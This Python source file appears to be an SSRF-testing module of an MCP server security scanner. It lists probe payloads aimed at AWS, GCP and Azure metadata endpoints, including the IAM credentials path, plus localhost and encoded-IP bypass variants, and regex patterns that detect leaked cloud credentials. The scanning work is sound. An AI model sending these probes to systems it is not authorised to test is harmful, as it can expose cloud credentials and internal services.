"""
SSRF (Server-Side Request Forgery) Module
Targets: MCP tools that accept URLs or make HTTP requests on behalf of tool calls.
Method: Sends internal/cloud-metadata URLs as parameters and detects via
        response content analysis and timing anomalies.
CWE-918: Server-Side Request Forgery
"""

import re
import time
import asyncio
from mcp import ClientSession

from .base import ScanModule
from ..models import Finding, FindingStatus, Severity

# OOB wait time — how long to wait for callback after sending OOB payload
_OOB_WAIT = 3.0

# ---------------------------------------------------------------------------
# Framework / SDK packages — scanning these directly produces FPs because
# their "SSRF-capable" tools are designed URL-fetching primitives, not bugs.
# When the server command matches one of these, all OOB-confirmed SSRF findings
# are downgraded to POTENTIAL with a context note.
# ---------------------------------------------------------------------------
KNOWN_FRAMEWORK_PACKAGES = {
    "fastmcp",
    "mcp",
    "@modelcontextprotocol/sdk",
    "@modelcontextprotocol/server-everything",  # demo/example server
}

# ---------------------------------------------------------------------------
# By-design URL-fetching tools — tools whose entire purpose is to fetch
# arbitrary URLs on behalf of the user. SSRF capability is the feature, not
# a bug. Findings on these tools are downgraded to POTENTIAL with a note.
#
# Three detection layers (any one is sufficient):
#   1. Known browser-automation / curl / fetch packages (exact match)
#   2. Tool name keywords that unambiguously indicate URL navigation as purpose
#   3. Tool description phrases that document unrestricted URL fetching
#
# Lesson from FIND-004 (@playwright/mcp, closed as FP 2026-03-31):
#   `browser_navigate` fetching http://127.0.0.1/ is the product, not a bug.
#   README: "Playwright MCP is not a security boundary."
# Also applies to: @browsermcp/mcp, curl wrappers, generic fetch servers.
# ---------------------------------------------------------------------------
KNOWN_FETCH_PACKAGES = {
    # Browser automation
    "@playwright/mcp",
    "@browsermcp/mcp",
    "@executeautomation/playwright-mcp-server",
    "puppeteer-mcp",
    "selenium-mcp",
    "browserbase-mcp",
    # Curl / HTTP client wrappers
    "@247arjun/mcp-curl",
    "@mcp-get-community/server-curl",
    "mcp-curl",
    # Generic fetch servers
    "fetch-mcp",
    "mcp-fetch",
    "mcp-server-fetch",
    "@modelcontextprotocol/server-fetch",
}

# Tool name fragments that unambiguously indicate "navigate to this URL" purpose
BY_DESIGN_TOOL_NAME_KEYWORDS = {
    "navigate", "browse", "visit", "open_url", "open_page",
    "curl_get", "curl_post", "curl_put", "curl_delete", "curl_download",
    "curl_advanced", "fetch_url", "fetch_html", "fetch_markdown",
    "fetch_json", "fetch_txt", "fetch_readable",
}

# Description phrases that explicitly document unrestricted URL fetching
BY_DESIGN_DESC_PHRASES = [
    re.compile(r"(fetch|retrieve|download|get)\s+(any|arbitrary|the|a)\s+(url|page|resource|content)", re.I),
    re.compile(r"navigate.{0,20}(url|page|website|web page)", re.I),
    re.compile(r"(browse|visit).{0,20}(url|page|website)", re.I),
    re.compile(r"make.{0,20}(http|curl|web).{0,20}request", re.I),
    re.compile(r"(curl|wget).{0,10}equivalent", re.I),
    re.compile(r"not.{0,20}(a )?security boundary", re.I),
]



# Parameter names that likely accept URLs or network targets
URL_PARAM_NAMES = [
    "url", "uri", "endpoint", "host", "server", "address",
    "target", "source", "location", "link", "href", "src",
    "webhook", "callback", "redirect", "proxy", "remote",
    "resource", "feed", "api_url", "base_url", "service",
]

# Tool names suggesting network/HTTP operations
NETWORK_TOOL_KEYWORDS = [
    "fetch", "get", "request", "http", "url", "web",
    "browse", "scrape", "download", "load", "import",
    "webhook", "callback", "proxy", "forward",
]

# SSRF probe targets in priority order
SSRF_PAYLOADS = [
    # Cloud metadata (highest impact — credential theft)
    ("AWS EC2 Metadata", "http://169.254.169.254/latest/meta-data/", "AWS IAM credentials exposure"),
    ("AWS EC2 IAM Credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials exposure"),
    ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", "GCP service account token exposure"),
    ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure managed identity exposure"),
    # Internal network probing
    ("Localhost HTTP", "http://127.0.0.1/", "Internal service access"),
    ("Localhost Alt Port", "http://127.0.0.1:8080/", "Internal service access"),
    ("IPv6 Localhost", "http://[::1]/", "Internal service access"),
    # DNS rebinding bypass variants
    ("0.0.0.0", "http://0.0.0.0/", "Internal service access"),
    ("Decimal IP Localhost", "http://2130706433/", "IP obfuscation bypass"),
    ("Hex IP Localhost", "http://0x7f000001/", "IP obfuscation bypass"),
]

# Evidence of successful SSRF in response
CLOUD_METADATA_PATTERNS = [
    re.compile(r'"instanceId"\s*:\s*"i-[0-9a-f]+"'),          # AWS EC2
    re.compile(r'"region"\s*:\s*"(us|eu|ap|sa|ca)-\w+-\d+"'), # AWS region
    re.compile(r'"AccessKeyId"\s*:\s*"ASIA[A-Z0-9]+"'),        # AWS STS creds
    re.compile(r'"email"\s*:\s*"\S+@developer\.gserviceaccount\.com"'),  # GCP
    re.compile(r'"compute\.googleapis\.com"'),                  # GCP metadata
    re.compile(r'"vmId"\s*:\s*"[a-f0-9\-]{36}"'),              # Azure IMDS
    re.compile(r'"subscriptionId"\s*:\s*"[a-f0-9\-]{36}"'),    # Azure
    re.compile(r'(nginx|apache|iis|werkzeug|express)',          re.IGNORECASE),  # Internal server
    # NOTE: generic HTML pattern removed — tools designed to fetch/render web content
    # (CSS docs, web scrapers, markdown converters) will always return HTML, making
    # this pattern a FP source. SSRF via HTML content requires OOB callback confirmation.
    re.compile(r'"healthy"\s*:\s*true', re.IGNORECASE), # Internal health endpoint — narrow match only
]

INTERNAL_RESPONSE_KEYWORDS = [
    "ami-id", "instance-type", "local-ipv4",  # AWS
    "project-id", "service-accounts",          # GCP
    "subscriptionId", "resourceGroupName",      # Azure
    "Server:", "Content-Type:",                 # HTTP headers in body
]


def _extract_text(result) -> str:
    parts = []
    for item in result.content:
        if hasattr(item, "text"):
            parts.append(item.text)
        elif isinstance(item, dict) and "text" in item:
            parts.append(item["text"])
    return "\n".join(parts)


def _check_ssrf_evidence(response_text: str) -> str | None:
    for pattern in CLOUD_METADATA_PATTERNS:
        match = pattern.search(response_text)
        if match:
            start = max(0, match.start() - 20)
            end = min(len(response_text), match.end() + 200)
            return response_text[start:end].strip()
    for keyword in INTERNAL_RESPONSE_KEYWORDS:
        if keyword.lower() in response_text.lower():
            idx = response_text.lower().index(keyword.lower())
            return response_text[max(0, idx-10):idx+100].strip()
    return None


def _is_by_design_fetch_tool(tool: dict, server_command: str) -> bool:
    """Returns True if this tool is explicitly designed to fetch arbitrary URLs.

    By-design URL-fetching tools are not vulnerable to SSRF in the traditional
    sense — fetching any URL IS the feature. Findings should be POTENTIAL with
    a deployment-context note, not CONFIRMED.

    Detection layers (any one sufficient):
    1. Server command matches a known browser/curl/fetch package
    2. Tool name is an exact by-design keyword (e.g. browser_navigate, curl_get)
    3. Tool description documents unrestricted URL fetching
    """
    # Layer 1: known package
    try:
        from ..utils.sast_scanner import _extract_package_name
        pkg = _extract_package_name(server_command)
        if pkg and pkg.lower() in {p.lower() for p in KNOWN_FETCH_PACKAGES}:
            return True
    except Exception:
        pass

    # Layer 2: tool name exact keyword match
    tool_name = tool.get("name", "").lower()
    if tool_name in BY_DESIGN_TOOL_NAME_KEYWORDS:
        return True

    # Layer 3: description documents unrestricted URL fetching
    desc = tool.get("description", "")
    if any(p.search(desc) for p in BY_DESIGN_DESC_PHRASES):
        return True

    return False


def _is_framework_target(server_command: str) -> bool:
    """Returns True if the server command targets a known MCP framework/SDK package.
    Uses exact package name extraction to avoid false matches on packages that
    merely contain framework names as substrings (e.g. 'mcp-shell-server' ≠ 'mcp').
    """
    try:
        from ..utils.sast_scanner import _extract_package_name
        pkg = _extract_package_name(server_command)
        if pkg:
            return pkg.lower() in {p.lower() for p in KNOWN_FRAMEWORK_PACKAGES}
    except Exception:
        pass
    return False


def _is_network_tool(tool: dict) -> bool:
    name = tool.get("name", "").lower()
    desc = tool.get("description", "").lower()
    schema = tool.get("inputSchema", {})
    param_names = [k.lower() for k in schema.get("properties", {}).keys()]

    for keyword in NETWORK_TOOL_KEYWORDS:
        if keyword in name or keyword in desc:
            return True
    return any(p in param_names for p in URL_PARAM_NAMES)


def _get_url_params(tool: dict) -> list[str]:
    schema = tool.get("inputSchema", {})
    properties = schema.get("properties", {})
    result = []
    for name, spec in properties.items():
        name_lower = name.lower()
        if name_lower in URL_PARAM_NAMES or "url" in name_lower or "uri" in name_lower:
            result.append(name)
    return result


class SSRFModule(ScanModule):
    module_id = "ssrf"
    name = "SSRF"
    description = "Tests MCP tools that accept URLs for Server-Side Request Forgery (CWE-918) — probes cloud metadata endpoints and internal services"

    async def run(self, session: ClientSession, tools: list[dict]) -> list[Finding]:
        findings: list[Finding] = []
        cb = self.callback_server  # May be None if scanner didn't inject it

        for tool in tools:
            if not _is_network_tool(tool):
                continue

            tool_name = tool["name"]
            url_params = _get_url_params(tool)
            if not url_params:
                url_params = [list(tool.get("inputSchema", {}).get("properties", {}).keys())[0]] \
                    if tool.get("inputSchema", {}).get("properties") else []
            if not url_params:
                continue

            for param in url_params:
                # ── Severity calibration ────────────────────────────────────────────
                # Framework package: CONFIRMED→POTENTIAL (library-level design pattern,
                # not a deployed-server vulnerability — maintainers will close as N/A).
                #
                # stdio transport: CRITICAL→HIGH, CVSS 9.1→7.5
                # Exploitation requires a compromised AI agent or client running locally.
                # The server is not network-exposed; cloud metadata is only reachable if
                # the host is a cloud VM. This matches maintainer feedback from FIND-013.
                #
                # sse/http/streamable-http: full CRITICAL — network-exposed, no prerequisite.
                # ────────────────────────────────────────────────────────────────────
                framework = _is_framework_target(self.server_command)
                by_design = _is_by_design_fetch_tool(tool, self.server_command)
                is_stdio = self.transport == "stdio"

                if framework:
                    oob_sev, oob_cvss, oob_status = Severity.HIGH, 7.5, FindingStatus.POTENTIAL
                    oob_title_prefix = "SSRF (Potential — Framework Package)"
                    oob_note = (
                        " NOTE: Downgraded — target is a known MCP framework/SDK package. "
                        "This may be a library-level design pattern rather than a deployed-server "
                        "vulnerability. Exploitability depends on how developers use this framework."
                    )
                elif by_design:
                    oob_sev, oob_cvss, oob_status = Severity.MEDIUM, 5.3, FindingStatus.POTENTIAL
                    oob_title_prefix = "SSRF (Potential — By-Design URL-Fetching Tool)"
                    oob_note = (
                        " NOTE: Downgraded — this tool appears explicitly designed to fetch "
                        "arbitrary URLs (browser automation, curl wrapper, or fetch utility). "
                        "URL fetching IS the feature, not a bug. SSRF risk is deployment-context "
                        "dependent — validate whether the server is intended to be restricted to "
                        "trusted AI agents only or exposed to untrusted callers."
                    )
                elif is_stdio:
                    oob_sev, oob_cvss, oob_status = Severity.HIGH, 7.5, FindingStatus.CONFIRMED
                    oob_title_prefix = "SSRF Confirmed (OOB) [stdio]"
                    oob_note = (
                        " NOTE: Severity is HIGH (not CRITICAL) — server runs as a local stdio "
                        "process. Exploitation requires a compromised AI agent or MCP client on "
                        "the same machine. Cloud metadata is only reachable if the host is a cloud VM."
                    )
                else:
                    oob_sev, oob_cvss, oob_status = Severity.CRITICAL, 9.1, FindingStatus.CONFIRMED
                    oob_title_prefix = "SSRF Confirmed (OOB)"
                    oob_note = ""

                remediation = (
                    "Implement a URL allowlist — only permit fetching from explicitly "
                    "approved external domains. Block all private IP ranges "
                    "(RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), "
                    "link-local (169.254.0.0/16), and loopback (127.0.0.0/8). "
                    "Resolve hostnames and re-check the resolved IP before connecting."
                )

                # Phase 1: OOB confirmation — send our own callback URL first
                # This is the most reliable way to confirm SSRF since the server fetches our listener
                if cb is not None:
                    token = cb.new_token()
                    oob_url = cb.url("ssrf", token)
                    try:
                        await asyncio.wait_for(
                            session.call_tool(tool_name, arguments={param: oob_url}),
                            timeout=10
                        )
                    except Exception:
                        pass
                    await asyncio.sleep(_OOB_WAIT)
                    hit = cb.was_hit(token)
                    if hit:
                        findings.append(Finding(
                            module_id=self.module_id,
                            title=f"{oob_title_prefix} via '{param}' in '{tool_name}'",
                            severity=oob_sev,
                            status=oob_status,
                            cvss_score=oob_cvss,
                            description=(
                                f"The MCP tool '{tool_name}' made an outbound HTTP request to our callback "
                                f"server when '{param}' was set to an attacker-controlled URL. This is a "
                                f"confirmed Out-of-Band SSRF — the server fetched our URL with no validation. "
                                f"An attacker can target internal services, cloud metadata endpoints, and "
                                f"private network resources." + oob_note
                            ),
                            tool_name=tool_name,
                            payload_used=oob_url,
                            evidence=(
                                f"Callback received at {hit.received_at} — "
                                f"method={hit.method}, path={hit.path}"
                            ),
                            remediation=remediation,
                            payload_args={param: oob_url},
                            raw_request={"tool": tool_name, "arguments": {param: oob_url}},
                            raw_response=f"OOB callback received: {hit.method} {hit.path}",
                            cwe_id="CWE-918",
                        ))
                        # Already handled SSRF for this param — skip cloud metadata probes
                        continue

                # Phase 2: Cloud metadata probes (content-based confirmation)
                for target_name, payload_url, impact in SSRF_PAYLOADS:
                    try:
                        # Measure baseline response time first
                        t_start = time.monotonic()
                        result = await asyncio.wait_for(
                            session.call_tool(tool_name, arguments={param: payload_url}),
                            timeout=15
                        )
                        elapsed = time.monotonic() - t_start
                        response_text = _extract_text(result)
                        evidence = _check_ssrf_evidence(response_text)

                        if evidence:
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"{oob_title_prefix} via '{param}' in '{tool_name}' — {target_name} Accessible",
                                severity=oob_sev,
                                status=oob_status,
                                cvss_score=oob_cvss,
                                description=(
                                    f"The MCP tool '{tool_name}' makes server-side HTTP requests using the "
                                    f"'{param}' parameter without validating the target URL. An attacker can "
                                    f"make the server fetch internal resources including cloud metadata endpoints, "
                                    f"potentially exposing IAM credentials and internal services. "
                                    f"Impact: {impact}." + oob_note
                                ),
                                tool_name=tool_name,
                                payload_used=payload_url,
                                evidence=f"Server returned {target_name} content: {evidence[:300]}",
                                remediation=remediation,
                                raw_request={"tool": tool_name, "arguments": {param: payload_url}},
                                raw_response=response_text[:1000],
                                cwe_id="CWE-918",
                            ))
                            break  # One confirmed SSRF per param is enough

                        # Timing-based detection for blind SSRF
                        # If response to internal IP took >3s but no content evidence
                        elif elapsed > 3.0 and "169.254" in payload_url:
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"Potential Blind SSRF via '{param}' in '{tool_name}'",
                                severity=Severity.HIGH,
                                status=FindingStatus.POTENTIAL,
                                cvss_score=7.5,
                                description=(
                                    f"The tool '{tool_name}' took {elapsed:.1f}s to respond to a request "
                                    f"targeting the cloud metadata endpoint ({payload_url}), suggesting the "
                                    f"server attempted to connect to that address (blind SSRF)."
                                ),
                                tool_name=tool_name,
                                payload_used=payload_url,
                                evidence=f"Response time {elapsed:.1f}s for internal IP — suggests outbound connection attempt",
                                remediation=(
                                    "Block all outbound connections to private IP ranges and link-local "
                                    "addresses. Use a URL allowlist for all server-side HTTP requests."
                                ),
                                cwe_id="CWE-918",
                            ))

                    except asyncio.TimeoutError:
                        # Timeout on metadata IP = server is trying to connect (blind SSRF indicator)
                        if "169.254" in payload_url or "127.0.0.1" in payload_url:
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"Potential Blind SSRF (Timeout) via '{param}' in '{tool_name}'",
                                severity=Severity.MEDIUM,
                                status=FindingStatus.POTENTIAL,
                                cvss_score=6.5,
                                description=(
                                    f"Request to '{tool_name}' with internal IP payload timed out after 15s, "
                                    f"suggesting the server made an outbound connection attempt that hung."
                                ),
                                tool_name=tool_name,
                                payload_used=payload_url,
                                evidence="Request timed out — server likely attempted outbound connection to internal address",
                                remediation="Block all outbound connections to private/loopback IP ranges.",
                                cwe_id="CWE-918",
                            ))
                            break
                    except Exception:
                        pass

        return findings
